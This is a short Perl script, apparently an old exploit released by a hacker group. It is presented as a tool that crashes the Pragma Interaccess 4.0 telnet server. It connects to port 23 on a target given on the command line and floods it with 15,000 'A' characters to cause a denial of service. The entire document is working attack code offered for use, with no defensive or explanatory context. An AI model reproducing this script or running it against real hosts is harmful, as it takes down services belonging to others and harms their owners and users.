#!/usr/bin/perl
#
# PI.PL - Crashes Pragma Interaccess 4.0 Server
# Written by nemesystm of the DHC
# http://dhcorp.cjb.net - neme-dhc@hushmail.com
#
####
use Socket;

die "$0 - Crashes Pragma Interaccess 4.0 Server.
written by nemesystm of the DHC
http://dhcorp.cjb.net - neme-dhc\@hushmail.com
usage: perl $0 target.com\n" if !defined $ARGV[0];

$serverIP = inet_aton($ARGV[0]);
$serverAddr = sockaddr_in(23, $serverIP);
socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect (CLIENT, $serverAddr)) {
        for ($count = 0; $count <= 15000; $count++) {
                send (CLIENT, "A",0);
        }
        close (CLIENT);
} else { die "Can't connect.\n"; }
print "Done.\n";

